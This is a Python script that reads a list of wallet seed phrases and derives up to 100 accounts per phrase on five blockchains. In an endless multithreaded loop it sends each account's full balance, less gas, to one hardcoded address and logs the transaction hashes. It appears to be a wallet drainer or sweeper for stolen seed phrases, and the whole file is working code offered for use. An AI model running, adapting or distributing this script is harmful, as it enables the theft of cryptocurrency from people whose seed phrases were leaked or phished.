from web3 import Web3
import time
from multiprocessing.pool import ThreadPool


def read_phrases():
    try:
        with open('phrases.txt', 'r', encoding='utf-8') as f:
            return f.readlines()
    except:
        print(f"Failed to read phrases.txt")


def auto_withdraw(to_address, depth):

    try:
        to_address = Web3.toChecksumAddress(to_address.lower())
    except Exception as err:
        print(f"Error in address to withdraw - {err}")

    tokens = [
        ['https://bsc-dataseed.binance.org/', 56, 'bsc', 'https://bscscan.com/tx/'],
        ['https://polygon-rpc.com', 137, 'matic', 'https://polygonscan.com/tx/'],
        ['https://api.avax.network/ext/bc/C/rpc', 43114, 'avax', 'https://cchain.explorer.avax.network/tx/'],
        ['https://rpc.ftm.tools/', 250, 'fantom', 'https://ftmscan.com/tx/'],
        ['https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161', 1, 'eth', 'https://etherscan.io/tx/'],
    ]

    for counter, token in enumerate(tokens):
        try:
            web3 = Web3(Web3.HTTPProvider(token[0]))
            web3.eth.account.enable_unaudited_hdwallet_features()
            tokens[counter].append(web3)
        except Exception as err:
            continue

    def token_transfer(seed, depth=depth):
        print(seed.strip())
        for token in tokens:
            try:
                token_rpc = token[0]
                token_id = token[1]
                token_name = token[2]
                token_url = token[3]
                web3 = token[4]

                seed = seed.strip()
                for account_number in range(depth):
                    try:
                        try:
                            account = web3.eth.account.from_mnemonic(seed,
                                                                     account_path=f"m/44'/60'/0'/0/{account_number}")
                        except Exception as e:
                                return
                        private_key = account.key.hex()[2:]
                        account_address = account.address

                        nonce = web3.eth.getTransactionCount(account_address, "pending")
                        try:
                            balance = web3.eth.get_balance(account_address)
                            estimate = web3.eth.estimate_gas({'to': to_address, 'from': account_address, 'value': balance})
                            gas_price = web3.fromWei(web3.eth.gas_price * estimate, 'ether')
                            send_value = web3.fromWei(balance, 'ether') - gas_price

                            tx = {'nonce': nonce, 'to': to_address, 'gas': estimate,
                                  'value': web3.toWei(send_value, 'ether'), 'gasPrice': web3.eth.gas_price}
                            if token_id:
                                tx['chainId'] = token_id
                        except ValueError as e:
                            if 'Client Error' in str(e.args[0]):
                                time.sleep(3)
                            continue

                        while True:
                            try:
                                signed_tx = web3.eth.account.signTransaction(tx, private_key)
                                tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
                                print(f'Transferred {send_value} {token_name}')

                                with open('withdraw_results.txt', 'a', encoding='utf-8') as f:
                                    f.write(
                                        f'transfer hash: {token_url}{tx_hash.hex()}, amount: {send_value} {token_name}\n')
                                break

                            except ValueError as e:
                                if 'insufficient funds for gas' in str(e.args[0]):
                                    break

                                elif 'nonce' in str(e.args[0]) or 'underpriced' in str(
                                        e.args[0]) or 'already known' in str(e.args[0]):
                                    time.sleep(0.5)
                                    continue

                                elif 'execution reverted' in str(e.args[0]) or 'unknown account' in str(e.args[0]):
                                    break

                                elif 'Client Error' in str(e.args[0]) or 'Server Error' in str(
                                        e.args[0]) or 'Could not decode' in str(e.args[0]):
                                    time.sleep(3)
                                    continue

                            except Exception as err:
                                print(err)
                                break
                            break
                    except Exception as err:
                        print(err)
                        continue
            except Exception as err:
                print(err)
                continue
    while True:
        try:
            seeds = read_phrases()
            print(f"Checking {len(seeds)} phrases for balances to withdraw...")
            pool = ThreadPool(10)
            for seed in seeds:
                pool.apply_async(token_transfer, args=(seed,))
            pool.close()
            pool.join()
            time.sleep(10)
        except Exception as err:
            print("error while running autoWithdraw, trying again...")
            continue


address_to_withdraw = '0x7DC4338903045392e83ac4D213aED1e9E122595A'
depth = 100 #ГЛУБИНА ВЫВОДА
auto_withdraw(to_address=address_to_withdraw, depth=depth)
